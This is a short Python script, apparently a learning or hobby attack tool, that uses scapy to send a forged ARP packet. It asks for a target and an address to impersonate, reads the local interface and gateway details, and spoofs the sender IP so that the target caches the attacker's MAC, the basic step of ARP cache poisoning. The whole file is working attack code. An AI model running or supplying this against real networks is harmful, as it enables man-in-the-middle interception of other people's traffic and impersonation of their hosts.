import netifaces
import socket
from scapy.all import *
import sys

if len(sys.argv) != 3:
    print "Who is target? Who will you impersonate?"
    sys.exit(1)

ifName = netifaces.interfaces()
ifName = ifName[1]

ifInfo = netifaces.ifaddresses(ifName)
ifMAC = ifInfo[17][0]['addr']
ifIP = ifInfo[2][0]['addr']

print "[*] My Interface Name : ", ifName
print "[*] My IP : ",ifIP 
print "[*] My MAC : ",ifMAC

gateInfo = netifaces.gateways()
gateIP = gateInfo['default'][2][0]
print "[*] Gateway Info : ", gateInfo
print "[*] Gateway IP : ", gateIP

packet = Ether()/ARP(op="who-has",hwsrc=ifMAC,psrc=sys.argv[2],pdst=sys.argv[1])
sendp(packet)
	
